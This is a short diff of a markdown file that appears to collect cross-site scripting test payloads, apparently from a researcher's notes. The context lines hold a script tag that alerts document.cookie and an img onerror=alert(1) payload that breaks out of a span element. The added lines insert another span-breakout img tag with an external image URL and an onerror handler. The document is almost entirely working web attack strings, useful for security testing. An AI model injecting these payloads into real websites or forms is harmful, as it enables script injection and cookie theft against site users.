@@ -28,6 +28,10 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 <form action="#" method="post"><label for="imgURL">image URL:</label><input type="url" id="imgURL"/><label for="pageURL">page URL:</label><input type="url" id="pageURL"/><button id="imgAdd">add image</button></form>
 ```
+- 0.1
+```
+</span><img src=https://cdn5-capriofiles.netdna-ssl.com/wp-content/uploads/2017/07/IMG_0068.gif <a href=http://example.com/> onerror=alert(1) /><span>
+```
 ## Error check
 ```
 </span><img src=1 onerror=alert(1) /><span>
